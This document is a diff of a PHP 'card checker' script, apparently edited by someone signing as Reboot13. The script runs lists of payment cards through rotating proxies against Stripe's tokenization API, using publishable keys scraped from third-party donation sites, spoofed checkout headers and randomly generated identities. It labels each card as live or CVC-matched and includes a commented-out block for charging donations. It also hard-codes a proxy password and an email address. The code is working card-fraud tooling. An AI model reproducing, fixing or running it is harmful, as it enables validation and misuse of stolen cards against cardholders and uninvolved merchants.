@@ -1,6 +1,6 @@
 <?php
 
-////////////////////////////===[khudka api banalo bc]
+////////////////////////////===[https://www.onegreenplanet.org/]///
 
 error_reporting(0);
 set_time_limit(0);
@@ -26,6 +26,7 @@ function GetStr($string, $start, $end)
   $str = explode($end, $str[1]);
   return $str[0];
 }
+
 function monarchproxys()
 {
   $poxySocks = file("Socks5.txt");
@@ -34,7 +35,6 @@ function monarchproxys()
   return $poxySocks;
 }
 $poxySocks4 = monarchproxys();
-
 ////////////////////////////===[Randomizing Details Api]
 
 $get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
@@ -56,31 +56,33 @@ preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
 $postcode = $matches1[1][0];
 
 ////////////////////////////===[Luminati Details]
-
-$username = 'Put Zone Username Here';
-$password = 'Put Zone Password Here';
-$port = 22225;
+$username = 'auto';
+$password = 'vDtA7foguwxENqZz2BbeFij4Y';
+$port = 8000;
 $session = mt_rand();
-$super_proxy = 'zproxy.lum-superproxy.io';
+$super_proxy = 'proxy.apify.com';
 
-////////////////////////////===[For Authorizing Cards]
+//=========================================================[Authorizing Cards]
 
 $ch = curl_init();
-/////////========Luminati
-// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
-// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
-////////=========Socks Proxy
+//============================[Proxy_Apify]
+
+
+//curl_setopt($ch, CURLOPT_PROXY, "proxy.apify.com:8000");
+//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "auto:vDtA7foguwxENqZz2BbeFij4Y");
 curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
 curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'accept: application/json', 
+'accept: application/json',
+'accept-encoding: gzip, deflate, br',
 'content-type: application/x-www-form-urlencoded',
 'origin: https://checkout.stripe.com',
-'referer: https://checkout.stripe.com/m/v3/index-7f66c3d8addf7af4ffc48af15300432a.html?distinct_id=4e2202a4-6385-0bd8-736b-82651e1df1ef',
+'referer: https://checkout.stripe.com/m/v3/index-7f66c3d8addf7af4ffc48af15300432a.html?distinct_id=92d78dee-ead1-d158-95ad-1c8ddd263833',
 'sec-fetch-mode: cors',
-'sec-fetch-site: same-site'));
+'sec-fetch-site: same-site'
+));
 //'user-agent: #'));
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
@@ -88,40 +90,31 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2Fa44017d)&referrer=https%3A%2F%2Fwww.onegreenplanet.org%2F&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&card[name]='.$firstname.'&time_on_page=16131&guid=95da8616-f593-4fdb-b65b-ee72d0a7cc56&muid=c4b66aad-1fa7-4db2-bcb3-2567842305e7&sid=2ac2ca52-c3d7-486f-8369-31d0b91df090&key=pk_live_jFIGNwQtOKGxGSPRIo1sxPts');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2Fa44017d)&referrer=https%3A%2F%2Fwww.futureme.org%2Fsupport&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&card[name]='.$name.'&time_on_page=15770&guid=95da8616-f593-4fdb-b65b-ee72d0a7cc56&muid=1be1b33c-fc43-4e50-a539-624933dcf36f&sid=2a52664f-37fc-48ca-ab03-735b41853e11&key=pk_live_9GV8Yezm7xiClB4kapZ2IN0r');
 
-$result = curl_exec($ch);
-// $token = trim(strip_tags(getStr($result,'"id": "','"')));
-
+echo $result = curl_exec($ch);
 ////////////////////////////===[For Charging Cards]-[If U Want To Charge Your Card Uncomment And Add Site]
 
-// $ch = curl_init();
-// /////////========Luminati
-// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
-// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
-// ////////=========Socks Proxy
-// //curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
-// curl_setopt($ch, CURLOPT_URL, '#');
-// curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-// curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-// curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-// curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-// curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-// curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-//   'Host: '#',    [If No Host Data On Site Dont Uncomment It]  
-//   'accept: '#',
-//   'content-type: #',
-//   'cookie: #',   [If No Cookie Data On Site Dont Uncomment It]
-//   'Origin: #',
-//   'referer: #',
-//   'Sec-Fetch-Mode: #',
-// ));
-// curl_setopt($ch, CURLOPT_POSTFIELDS, '#');
+/*//$ch = curl_init();
+//curl_setopt($ch, CURLOPT_URL, 'https://www.futureme.org/payments/stripe.json');
+//curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'Host: www.futureme.org',
+'accept: text/plain, *//*; q=0.01',
+'content-type: application/x-www-form-urlencoded; charset=UTF-8',
+'Origin: https://www.futureme.org',
+'referer: https://www.futureme.org/donate',
+'Sec-Fetch-Mode: cors'));
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'stripeToken=tok_Gtuws5vWQ3pzym&stripeEmail=jordanti02%40gmail.com&recurring=false&donationAmount=500&path=%2Fdonate');
 
-// $result = curl_exec($ch);
-// $message = trim(strip_tags(getStr($result,'"message":"','"'))); 
-
-////////////////////////////===[Card Response]
+echo $result = curl_exec($ch);
+$message = trim(strip_tags(getStr($result,'"message":"','"'))); 
+$token = trim(strip_tags(getStr($result,'"id": "','"')));
+//////////////////////===[Card Response] */
 
 if (strpos($result, '"cvc_check": "pass"')) {
   echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ CV MATCHED 𝕽𝖊𝖇𝖔𝖔𝖙 ♛ </span></br>';
@@ -132,13 +125,13 @@ elseif(strpos($result, "Thank You For Donation." )) {
 elseif(strpos($result, "Thank You." )) {
   echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ CVC MATCHED 𝕽𝖊𝖇𝖔𝖔𝖙 ♛ </span></br>';
 }
-elseif(strpos($result, 'security code is incorrect.' )) {
+elseif(strpos($result, "Your card's security code is incorrect." )) {
+  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ CCN LIVE 𝕽𝖊𝖇𝖔𝖔𝖙 ♛ </span></br>';
+}
+elseif(strpos($result, "Your card's security code is invalid." )) {
   echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ CCN LIVE 𝕽𝖊𝖇𝖔𝖔𝖙 ♛ </span></br>';
 }
 elseif (strpos($result, "incorrect_cvc")) {
-  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ CCN LIVE 𝕽𝖊𝖇𝖔𝖔𝖙 ♛ </span></br>';
-}
-elseif (strpos($result, "Your card's security code is invalid.")) {
   echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ CCN LIVE 𝕽𝖊𝖇𝖔𝖔𝖙 ♛ </span></br>';
 }
 elseif(strpos($result, 'Your card zip code is incorrect.' )) {
@@ -192,8 +185,7 @@ elseif (strpos($result,'Your card does not support this type of purchase.')) {
 
 curl_close($ch);
 ob_flush();
-//////=========Comment Echo $result If U Want To Hide Site Side Response
-echo $result 
 
-///////////////////////////////////////////////===========================Edited By Reboot13================================================\\\\\\\\\\\\\\\
-?>
+//////=========Comment Echo $result If U Want To Hide Site Side Response 
+
+///////////////////////////////////////////////===========================Edited By Reboot13================================================\\\\\
